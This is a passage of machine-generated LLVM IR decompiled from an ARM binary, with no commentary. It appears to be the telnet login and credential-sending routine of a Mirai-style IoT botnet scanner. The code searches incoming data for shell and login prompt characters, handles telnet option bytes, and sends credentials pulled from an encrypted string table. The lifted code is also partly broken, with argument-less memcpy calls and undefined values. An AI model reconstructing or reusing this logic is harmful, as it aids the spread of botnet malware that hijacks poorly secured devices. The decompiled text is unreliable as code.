  br i1 %v7_f610, label %dec_label_pc_ef54.backedge.thread561, label %dec_label_pc_f618

dec_label_pc_f618:                                ; preds = %dec_label_pc_f610
  %v1_f618 = add i32 %v0_f608, -2
  %v2_f618 = inttoptr i32 %v1_f618 to i8*
  %v3_f618 = load i8, i8* %v2_f618, align 1
  %v4_f618 = zext i8 %v3_f618 to i32
  store i32 %v4_f618, i32* %r2.global-to-local, align 4
  %v2_f61c = icmp ugt i8 %v3_f618, 61
  store i1 %v2_f61c, i1* %cpsr_c.global-to-local, align 1
  %v7_f61c = icmp eq i8 %v3_f618, 62
  store i1 %v7_f61c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f61c, label %dec_label_pc_f628, label %bb445

bb445:                                            ; preds = %dec_label_pc_f618
  %v3_f620 = icmp ugt i8 %v3_f618, 57
  store i1 %v3_f620, i1* %cpsr_c.global-to-local, align 1
  %v8_f620 = icmp eq i8 %v3_f618, 58
  store i1 %v8_f620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f620, label %dec_label_pc_f628, label %dec_label_pc_f5f4

dec_label_pc_f628:                                ; preds = %dec_label_pc_f618, %bb445, %dec_label_pc_f604, %dec_label_pc_f5fc, %dec_label_pc_f5f4, %dec_label_pc_f5e0, %dec_label_pc_f5bc, %dec_label_pc_f5d8, %dec_label_pc_f5d0, %bb444
  %v0_f62c = phi i32 [ %v1_f5b0, %dec_label_pc_f5e0 ], [ %v1_f5b0, %dec_label_pc_f5bc ], [ %v1_f5b0, %dec_label_pc_f5d8 ], [ %v1_f5b0, %dec_label_pc_f5d0 ], [ %v1_f5b0, %bb444 ], [ %v1_f610, %dec_label_pc_f5f4 ], [ %v1_f610, %dec_label_pc_f5fc ], [ %v1_f610, %dec_label_pc_f604 ], [ %v1_f610, %bb445 ], [ %v1_f610, %dec_label_pc_f618 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f62c = add i32 %v0_f62c, 1
  store i32 %v1_f62c, i32* @r7, align 4
  %v1_f630 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_f640 = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_f640, i32* %r0.global-to-local, align 4
  %v3_f644 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f644, i32* %r2.global-to-local, align 4
  store i32 %v3_f640, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f650 = load i32, i32* @r6, align 4
  %v1_f650 = add i32 %v0_f650, 4
  %v2_f650 = inttoptr i32 %v1_f650 to i32*
  %v3_f650 = load i32, i32* %v2_f650, align 4
  store i32 %v3_f650, i32* %r0.global-to-local, align 4
  %v4_f654 = call i32 @__libc_send(i32 %v3_f650, i32 %v3_f640, i32 %v3_f644, i32 16384)
  store i32 %v4_f654, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f664 = load i32, i32* @r6, align 4
  %v1_f664 = add i32 %v0_f664, 4
  %v2_f664 = inttoptr i32 %v1_f664 to i32*
  %v3_f664 = load i32, i32* %v2_f664, align 4
  store i32 %v3_f664, i32* %r0.global-to-local, align 4
  %v4_f668 = call i32 @__libc_send(i32 %v3_f664, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f670 = call i32 @table_lock_val(i32 4)
  store i32 %v1_f670, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f678 = load i32, i32* @r6, align 4
  %v2_f678 = add i32 %v1_f678, 12
  %v3_f678 = inttoptr i32 %v2_f678 to i32*
  store i32 8, i32* %v3_f678, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f680:                                ; preds = %dec_label_pc_efd0
  %v1_f680 = add i32 %v0_efd0, 24
  %v2_f680 = inttoptr i32 %v1_f680 to i32*
  %v3_f680 = load i32, i32* %v2_f680, align 4
  store i32 %v3_f680, i32* %r2.global-to-local, align 4
  %v1_f684 = add i32 %v3_f680, -1
  store i32 %v1_f684, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f688 = icmp eq i32 %v1_f684, 0
  store i1 %v2_f688, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f684, 1
  br i1 %tmp446, label %dec_label_pc_f6ec, label %dec_label_pc_f690

dec_label_pc_f690:                                ; preds = %dec_label_pc_f680
  %v2_f690 = add i32 %v1_f684, %v0_efd0
  store i32 %v2_f690, i32* %r3.global-to-local, align 4
  %v1_f694 = add i32 %v2_f690, 28
  %v2_f694 = inttoptr i32 %v1_f694 to i8*
  %v3_f694 = load i8, i8* %v2_f694, align 1
  %v4_f694 = zext i8 %v3_f694 to i32
  store i32 %v4_f694, i32* %r3.global-to-local, align 4
  %v2_f698 = icmp ugt i8 %v3_f694, 61
  store i1 %v2_f698, i1* %cpsr_c.global-to-local, align 1
  %v7_f698 = icmp eq i8 %v3_f694, 62
  store i1 %v7_f698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f698, label %dec_label_pc_f954, label %bb447

bb447:                                            ; preds = %dec_label_pc_f690
  %v3_f69c = icmp ugt i8 %v3_f694, 57
  store i1 %v3_f69c, i1* %cpsr_c.global-to-local, align 1
  %v8_f69c = icmp eq i8 %v3_f694, 58
  store i1 %v8_f69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f69c, label %dec_label_pc_f954, label %dec_label_pc_f6a4

dec_label_pc_f6a4:                                ; preds = %bb447
  %v2_f6a4 = icmp ugt i8 %v3_f694, 35
  store i1 %v2_f6a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6a4 = icmp eq i8 %v3_f694, 36
  store i1 %v7_f6a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6a4, label %dec_label_pc_f954, label %dec_label_pc_f6ac

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f6a4
  %v2_f6ac = icmp ugt i8 %v3_f694, 34
  store i1 %v2_f6ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f6ac = icmp eq i8 %v3_f694, 35
  store i1 %v7_f6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6ac, label %dec_label_pc_f954, label %dec_label_pc_f6e4.preheader

dec_label_pc_f6e4.preheader:                      ; preds = %dec_label_pc_f6ac
  %v3_f6b0 = add i32 %v0_efd0, 28
  %v2_f6b4 = add i32 %v3_f6b0, %v3_f680
  store i32 %v2_f6b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_f6c0:                                ; preds = %dec_label_pc_f6e4
  %v1_f6c0 = add i32 %v0_f6dc, -2
  %v2_f6c0 = inttoptr i32 %v1_f6c0 to i8*
  %v3_f6c0 = load i8, i8* %v2_f6c0, align 1
  %v4_f6c0 = zext i8 %v3_f6c0 to i32
  store i32 %v4_f6c0, i32* %r2.global-to-local, align 4
  %v2_f6c4 = icmp ugt i8 %v3_f6c0, 61
  store i1 %v2_f6c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c4 = icmp eq i8 %v3_f6c0, 62
  store i1 %v7_f6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6c4, label %dec_label_pc_f954, label %bb448

bb448:                                            ; preds = %dec_label_pc_f6c0
  %v3_f6c8 = icmp ugt i8 %v3_f6c0, 57
  store i1 %v3_f6c8, i1* %cpsr_c.global-to-local, align 1
  %v8_f6c8 = icmp eq i8 %v3_f6c0, 58
  store i1 %v8_f6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6c8, label %dec_label_pc_f954, label %dec_label_pc_f6d0

dec_label_pc_f6d0:                                ; preds = %bb448
  %v2_f6d0 = icmp ugt i8 %v3_f6c0, 35
  store i1 %v2_f6d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d0 = icmp eq i8 %v3_f6c0, 36
  store i1 %v7_f6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6d0, label %dec_label_pc_f954, label %dec_label_pc_f6d8

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6d0
  %v2_f6d8 = icmp ugt i8 %v3_f6c0, 34
  store i1 %v2_f6d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d8 = icmp eq i8 %v3_f6c0, 35
  store i1 %v7_f6d8, i1* %cpsr_z.global-to-local, align 1
  %v1_f6dc = add i32 %v0_f6dc, -1
  store i32 %v1_f6dc, i32* %r3.global-to-local, align 4
  br i1 %v7_f6d8, label %dec_label_pc_f954, label %dec_label_pc_f6e4

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f6e4.preheader, %dec_label_pc_f6d8
  %v0_f6dc = phi i32 [ %v2_f6b4, %dec_label_pc_f6e4.preheader ], [ %v1_f6dc, %dec_label_pc_f6d8 ]
  %v0_f6e4 = phi i32 [ %v1_f684, %dec_label_pc_f6e4.preheader ], [ %v1_f6e4, %dec_label_pc_f6d8 ]
  %v1_f6e4 = add i32 %v0_f6e4, -1
  store i32 %v1_f6e4, i32* %r1.global-to-local, align 4
  %v2_f6e4 = icmp ne i32 %v0_f6e4, 0
  store i1 %v2_f6e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6e4 = icmp eq i32 %v0_f6e4, 1
  store i1 %v7_f6e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6e4, label %dec_label_pc_f6ec, label %dec_label_pc_f6c0

dec_label_pc_f6ec:                                ; preds = %dec_label_pc_f6e4, %dec_label_pc_f680
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f6f0 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_f700 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  %v3_f704 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f700, i32* %r2.global-to-local, align 4
  %v1_f70c = add i32 %v3_f704, -1
  store i32 %v1_f70c, i32* %r3.global-to-local, align 4
  %v0_f710 = load i32, i32* @sb, align 4
  store i32 %v0_f710, i32* %r0.global-to-local, align 4
  %v0_f714 = load i32, i32* @r6, align 4
  %v1_f714 = add i32 %v0_f714, 24
  %v2_f714 = inttoptr i32 %v1_f714 to i32*
  %v3_f714 = load i32, i32* %v2_f714, align 4
  store i32 %v3_f714, i32* %r1.global-to-local, align 4
  %v4_f718 = call i32 @util_memsearch(i32 %v0_f710, i32 %v3_f714, i32 %v3_f700, i32 %v1_f70c)
  store i32 %v4_f718, i32* %r0.global-to-local, align 4
  %v1_f71c = add i32 %v4_f718, 1
  store i32 %v1_f71c, i32* @r7, align 4
  %v2_f71c = icmp eq i32 %v4_f718, -1
  store i1 %v2_f71c, i1* %cpsr_c.global-to-local, align 1
  %v7_f71c = icmp eq i32 %v1_f71c, 0
  store i1 %v7_f71c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f71c, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f6ec
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f6ec, %bb449
  %v0_f724 = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f6ec ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f724, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_fb70 = call i32 @table_lock_val(i32 25)
  br i1 %v0_f724, label %dec_label_pc_fb6c, label %dec_label_pc_f734

dec_label_pc_f734:                                ; preds = %thread-pre-split124, %dec_label_pc_f954
  %storemerge = phi i32 [ %v1_f95c, %dec_label_pc_f954 ], [ %v1_fb70, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f734 = load i32, i32* @r6, align 4
  %v1_f734 = inttoptr i32 %v0_f734 to i32*
  %v2_f734 = load i32, i32* %v1_f734, align 4
  store i32 %v2_f734, i32* %r3.global-to-local, align 4
  %v1_f738 = add i32 %v0_f734, 4
  %v2_f738 = inttoptr i32 %v1_f738 to i32*
  %v3_f738 = load i32, i32* %v2_f738, align 4
  store i32 %v3_f738, i32* %r0.global-to-local, align 4
  %v1_f73c = add i32 %v2_f734, 13
  %v2_f73c = inttoptr i32 %v1_f73c to i8*
  %v3_f73c = load i8, i8* %v2_f73c, align 1
  %v4_f73c = zext i8 %v3_f73c to i32
  store i32 %v4_f73c, i32* %r2.global-to-local, align 4
  %v1_f740 = add i32 %v2_f734, 4
  %v2_f740 = inttoptr i32 %v1_f740 to i32*
  %v3_f740 = load i32, i32* %v2_f740, align 4
  store i32 %v3_f740, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f748 = call i32 @__libc_send(i32 %v3_f738, i32 %v3_f740, i32 %v4_f73c, i32 16384)
  store i32 %v4_f748, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f750 = load i32, i32* @r6, align 4
  %v1_f750 = add i32 %v0_f750, 4
  %v2_f750 = inttoptr i32 %v1_f750 to i32*
  %v3_f750 = load i32, i32* %v2_f750, align 4
  store i32 %v3_f750, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f75c = call i32 @__libc_send(i32 %v3_f750, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 %v4_f75c, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f764 = load i32, i32* @r6, align 4
  %v2_f764 = add i32 %v1_f764, 12
  %v3_f764 = inttoptr i32 %v2_f764 to i32*
  store i32 5, i32* %v3_f764, align 4
  br label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %dec_label_pc_f37c, %bb436, %dec_label_pc_f878, %dec_label_pc_f9b0, %dec_label_pc_f91c, %dec_label_pc_f9f4, %dec_label_pc_f734
  %v0_f768 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f768 = icmp eq i32 %v0_f768, 0
  store i1 %v2_f768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f768, label %dec_label_pc_ef50.loopexit, label %dec_label_pc_f0ec

dec_label_pc_f774:                                ; preds = %dec_label_pc_efd0
  %v1_f774 = add i32 %v0_efd0, 24
  %v2_f774 = inttoptr i32 %v1_f774 to i32*
  %v3_f774 = load i32, i32* %v2_f774, align 4
  store i32 %v3_f774, i32* %r2.global-to-local, align 4
  %v1_f778 = add i32 %v3_f774, -1
  store i32 %v1_f778, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f77c = icmp eq i32 %v1_f778, 0
  store i1 %v2_f77c, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f778, 1
  br i1 %tmp450, label %dec_label_pc_f7f0, label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %dec_label_pc_f774
  %v2_f784 = add i32 %v1_f778, %v0_efd0
  store i32 %v2_f784, i32* %r3.global-to-local, align 4
  %v1_f788 = add i32 %v2_f784, 28
  %v2_f788 = inttoptr i32 %v1_f788 to i8*
  %v3_f788 = load i8, i8* %v2_f788, align 1
  %v4_f788 = zext i8 %v3_f788 to i32
  store i32 %v4_f788, i32* %r3.global-to-local, align 4
  %v2_f78c = icmp ugt i8 %v3_f788, 61
  store i1 %v2_f78c, i1* %cpsr_c.global-to-local, align 1
  %v7_f78c = icmp eq i8 %v3_f788, 62
  store i1 %v7_f78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f78c, label %dec_label_pc_f908, label %bb451

bb451:                                            ; preds = %dec_label_pc_f784
  %v3_f790 = icmp ugt i8 %v3_f788, 57
  store i1 %v3_f790, i1* %cpsr_c.global-to-local, align 1
  %v8_f790 = icmp eq i8 %v3_f788, 58
  store i1 %v8_f790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f790, label %dec_label_pc_f908, label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %bb451
  %v2_f798 = icmp ugt i8 %v3_f788, 35
  store i1 %v2_f798, i1* %cpsr_c.global-to-local, align 1
  %v7_f798 = icmp eq i8 %v3_f788, 36
  store i1 %v7_f798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f798, label %dec_label_pc_f908, label %dec_label_pc_f7a0

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f798
  %v2_f7a0 = icmp ugt i8 %v3_f788, 34
  store i1 %v2_f7a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a0 = icmp eq i8 %v3_f788, 35
  store i1 %v7_f7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a0, label %dec_label_pc_f908, label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f7a0
  %v2_f7a8 = icmp ugt i8 %v3_f788, 36
  store i1 %v2_f7a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a8 = icmp eq i8 %v3_f788, 37
  store i1 %v7_f7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a8, label %dec_label_pc_f908, label %dec_label_pc_f7e8.preheader

dec_label_pc_f7e8.preheader:                      ; preds = %dec_label_pc_f7a8
  %v3_f7ac = add i32 %v0_efd0, 28
  %v2_f7b0 = add i32 %v3_f7ac, %v3_f774
  store i32 %v2_f7b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7e8

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f7e8
  %v1_f7bc = add i32 %v0_f7e0, -2
  %v2_f7bc = inttoptr i32 %v1_f7bc to i8*
  %v3_f7bc = load i8, i8* %v2_f7bc, align 1
  %v4_f7bc = zext i8 %v3_f7bc to i32
  store i32 %v4_f7bc, i32* %r2.global-to-local, align 4
  %v2_f7c0 = icmp ugt i8 %v3_f7bc, 61
  store i1 %v2_f7c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c0 = icmp eq i8 %v3_f7bc, 62
  store i1 %v7_f7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c0, label %dec_label_pc_f908, label %bb452

bb452:                                            ; preds = %dec_label_pc_f7bc
  %v3_f7c4 = icmp ugt i8 %v3_f7bc, 57
  store i1 %v3_f7c4, i1* %cpsr_c.global-to-local, align 1
  %v8_f7c4 = icmp eq i8 %v3_f7bc, 58
  store i1 %v8_f7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7c4, label %dec_label_pc_f908, label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %bb452
  %v2_f7cc = icmp ugt i8 %v3_f7bc, 35
  store i1 %v2_f7cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7cc = icmp eq i8 %v3_f7bc, 36
  store i1 %v7_f7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7cc, label %dec_label_pc_f908, label %dec_label_pc_f7d4

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7cc
  %v2_f7d4 = icmp ugt i8 %v3_f7bc, 34
  store i1 %v2_f7d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7d4 = icmp eq i8 %v3_f7bc, 35
  store i1 %v7_f7d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7d4, label %dec_label_pc_f908, label %dec_label_pc_f7dc

dec_label_pc_f7dc:                                ; preds = %dec_label_pc_f7d4
  %v2_f7dc = icmp ugt i8 %v3_f7bc, 36
  store i1 %v2_f7dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7dc = icmp eq i8 %v3_f7bc, 37
  store i1 %v7_f7dc, i1* %cpsr_z.global-to-local, align 1
  %v1_f7e0 = add i32 %v0_f7e0, -1
  store i32 %v1_f7e0, i32* %r3.global-to-local, align 4
  br i1 %v7_f7dc, label %dec_label_pc_f908, label %dec_label_pc_f7e8

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_f7e8.preheader, %dec_label_pc_f7dc
  %v0_f7e0 = phi i32 [ %v2_f7b0, %dec_label_pc_f7e8.preheader ], [ %v1_f7e0, %dec_label_pc_f7dc ]
  %v0_f7e8 = phi i32 [ %v1_f778, %dec_label_pc_f7e8.preheader ], [ %v1_f7e8, %dec_label_pc_f7dc ]
  %v1_f7e8 = add i32 %v0_f7e8, -1
  store i32 %v1_f7e8, i32* %r1.global-to-local, align 4
  %v2_f7e8 = icmp ne i32 %v0_f7e8, 0
  store i1 %v2_f7e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7e8 = icmp eq i32 %v0_f7e8, 1
  store i1 %v7_f7e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7e8, label %dec_label_pc_f7f0, label %dec_label_pc_f7bc

dec_label_pc_f7f0:                                ; preds = %dec_label_pc_f7e8, %dec_label_pc_f774
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f7f4 = call i32 @table_unlock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f7fc = call i32 @table_unlock_val(i32 27)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_f80c = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_f80c, i32* @r4, align 4
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_f820 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_f824 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f820, 16777216
  %v1_f828 = sdiv i32 %sext, 16777216
  store i32 %v1_f828, i32* @r5, align 4
  %v0_f82c = load i32, i32* @r4, align 4
  store i32 %v0_f82c, i32* %r2.global-to-local, align 4
  %v1_f830 = add i32 %v3_f824, -1
  store i32 %v1_f830, i32* %r3.global-to-local, align 4
  %v0_f834 = load i32, i32* @sb, align 4
  store i32 %v0_f834, i32* %r0.global-to-local, align 4
  %v0_f838 = load i32, i32* @r6, align 4
  %v1_f838 = add i32 %v0_f838, 24
  %v2_f838 = inttoptr i32 %v1_f838 to i32*
  %v3_f838 = load i32, i32* %v2_f838, align 4
  store i32 %v3_f838, i32* %r1.global-to-local, align 4
  %v4_f83c = call i32 @util_memsearch(i32 %v0_f834, i32 %v3_f838, i32 %v0_f82c, i32 %v1_f830)
  store i32 %v4_f83c, i32* %r0.global-to-local, align 4
  %v2_f840 = icmp eq i32 %v4_f83c, -1
  store i1 %v2_f840, i1* %cpsr_c.global-to-local, align 1
  %v7_f840 = icmp eq i32 %v4_f83c, -1
  store i1 %v7_f840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f840, label %dec_label_pc_f850, label %dec_label_pc_f878

dec_label_pc_f850:                                ; preds = %dec_label_pc_f7f0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f850 = load i32, i32* %stack_var_-60, align 4
  %v0_f854 = load i32, i32* @r5, align 4
  store i32 %v0_f854, i32* %r2.global-to-local, align 4
  %v1_f858 = add i32 %v3_f850, -1
  store i32 %v1_f858, i32* %r3.global-to-local, align 4
  %v0_f85c = load i32, i32* @sb, align 4
  store i32 %v0_f85c, i32* %r0.global-to-local, align 4
  %v0_f860 = load i32, i32* @r6, align 4
  %v1_f860 = add i32 %v0_f860, 24
  %v2_f860 = inttoptr i32 %v1_f860 to i32*
  %v3_f860 = load i32, i32* %v2_f860, align 4
  store i32 %v3_f860, i32* %r1.global-to-local, align 4
  %v4_f864 = call i32 @util_memsearch(i32 %v0_f85c, i32 %v3_f860, i32 %v0_f854, i32 %v1_f858)
  store i32 %v4_f864, i32* %r0.global-to-local, align 4
  %v1_f868 = add i32 %v4_f864, 1
  store i32 %v1_f868, i32* @r7, align 4
  %v2_f868 = icmp eq i32 %v4_f864, -1
  store i1 %v2_f868, i1* %cpsr_c.global-to-local, align 1
  %v7_f868 = icmp eq i32 %v1_f868, 0
  store i1 %v7_f868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f868, label %dec_label_pc_fb2c, label %dec_label_pc_f878

dec_label_pc_f878:                                ; preds = %dec_label_pc_f850, %dec_label_pc_f7f0
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f87c = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f884 = call i32 @table_lock_val(i32 27)
  store i32 %v1_f884, i32* %r0.global-to-local, align 4
  %v0_f888 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f888 = icmp eq i32 %v0_f888, 0
  store i1 %v2_f888, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f888, 1
  br i1 %tmp453, label %dec_label_pc_f768, label %dec_label_pc_f91c

dec_label_pc_f894:                                ; preds = %dec_label_pc_f300
  store i32 %v2_f898, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1907c.203 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f898, i32* @r0, align 4
  store i32 %v2_f8ac, i32* @sl, align 4
  %v0_f8b0 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f8ac, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19073.205 to i32), i32* @r1, align 4
  %v0_f8c0 = call i32 @memcpy()
  store i32 %v0_f8c0, i32* %r0.global-to-local, align 4
  %v0_f8c4 = load i32, i32* @r6, align 4
  %v1_f8c4 = add i32 %v0_f8c4, 24
  %v2_f8c4 = inttoptr i32 %v1_f8c4 to i32*
  %v3_f8c4 = load i32, i32* %v2_f8c4, align 4
  %v0_f8c8 = load i32, i32* @r4, align 4
  %v1_f8c8 = add i32 %v0_f8c8, 2
  store i32 %v1_f8c8, i32* %r2.global-to-local, align 4
  %v0_f8cc = load i32, i32* @sb, align 4
  %v2_f8cc = add i32 %v0_f8cc, %v3_f8c4
  store i32 %v2_f8cc, i32* @r3, align 4
  %v3_f8d0 = icmp uge i32 %v2_f8cc, %v1_f8c8
  store i1 %v3_f8d0, i1* %cpsr_c.global-to-local, align 1
  %v9_f8d0 = icmp eq i32 %v2_f8cc, %v1_f8c8
  store i1 %v9_f8d0, i1* %cpsr_z.global-to-local, align 1
  %v2_f8d4 = xor i1 %v3_f8d0, true
  %v3_f8d4 = or i1 %v9_f8d0, %v2_f8d4
  br i1 %v3_f8d4, label %dec_label_pc_f894.dec_label_pc_f37c.loopexit_crit_edge, label %dec_label_pc_f8d8

dec_label_pc_f894.dec_label_pc_f37c.loopexit_crit_edge: ; preds = %dec_label_pc_f894
  %v0_f37c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f37c

dec_label_pc_f8d8:                                ; preds = %dec_label_pc_f894
  %v2_f8d8 = inttoptr i32 %v1_f8c8 to i8*
  %v3_f8d8 = load i8, i8* %v2_f8d8, align 1
  %v4_f8d8 = zext i8 %v3_f8d8 to i32
  store i32 %v4_f8d8, i32* %r3.global-to-local, align 4
  %v2_f8dc = icmp ugt i8 %v3_f8d8, 30
  store i1 %v2_f8dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8dc = icmp eq i8 %v3_f8d8, 31
  store i1 %v7_f8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8dc, label %dec_label_pc_fa0c, label %dec_label_pc_f8e4

dec_label_pc_f8e4:                                ; preds = %dec_label_pc_f8d8
  %v1_f8e4 = inttoptr i32 %v0_f8c8 to i8*
  %v2_f8e4 = load i8, i8* %v1_f8e4, align 1
  %v3_f8e4 = zext i8 %v2_f8e4 to i32
  store i32 %v3_f8e4, i32* %r3.global-to-local, align 4
  %v2_f8e8 = icmp ugt i8 %v2_f8e4, -4
  store i1 %v2_f8e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8e8 = icmp eq i8 %v2_f8e4, -3
  store i1 %v7_f8e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8e8, label %.thread138, label %dec_label_pc_f8f8

.thread138:                                       ; preds = %dec_label_pc_f8e4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f8e4, align 1
  %v0_f8f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8f4.pr.pr, label %dec_label_pc_f314, label %.thread138.dec_label_pc_f8f8thread-pre-split_crit_edge

.thread138.dec_label_pc_f8f8thread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f8f8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f8f8

dec_label_pc_f8f8:                                ; preds = %dec_label_pc_f8e4, %.thread138.dec_label_pc_f8f8thread-pre-split_crit_edge
  %v0_f8f8.pr = phi i32 [ %v0_f8f8.pr.pre, %.thread138.dec_label_pc_f8f8thread-pre-split_crit_edge ], [ %v3_f8e4, %dec_label_pc_f8e4 ]
  %v2_f8f8 = icmp ugt i32 %v0_f8f8.pr, 250
  store i1 %v2_f8f8, i1* %cpsr_c.global-to-local, align 1
